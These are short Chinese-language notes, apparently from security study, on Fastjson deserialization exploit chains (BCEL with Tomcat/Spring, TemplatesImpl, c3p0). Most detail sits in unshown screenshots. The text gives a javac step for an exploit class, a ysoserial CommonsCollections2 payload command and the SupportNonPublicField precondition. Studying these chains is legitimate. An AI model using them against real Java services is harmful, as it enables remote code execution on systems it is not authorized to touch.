## BCEL-Tomcat&Spring链

![image-20260219162938728](images/image-20260219162938728.png)

编译成class

```
javac .\exp.java
```

替换变成路径 运行变成Becl格式

![image-20260219163042811](images/image-20260219163042811.png)

##   修改poc   gadget链

![image-20260219163810014](images/image-20260219163810014.png)

## TemplatesImpl链

条件条件：JSON.parseObject(payload, Feature.SupportNonPublicField);

编译成class

![image-20260219165639002](images/image-20260219165639002.png)

变成字节流

![image-20260219165711830](images/image-20260219165711830.png)

对方必须要有SupportNonPublicField

![image-20260219165727600](images/image-20260219165727600.png)

## c3p0链

条件：依赖包

```
java -jar ysoserial.jar CommonsCollections2 "clac" > calc.ser
```

生成后放入项目中 写入路径

![image-20260219170959194](images/image-20260219170959194.png)

生成数据 获得利用链

![image-20260219171030813](images/image-20260219171030813.png)

![image-20260219171623599](images/image-20260219171623599.png)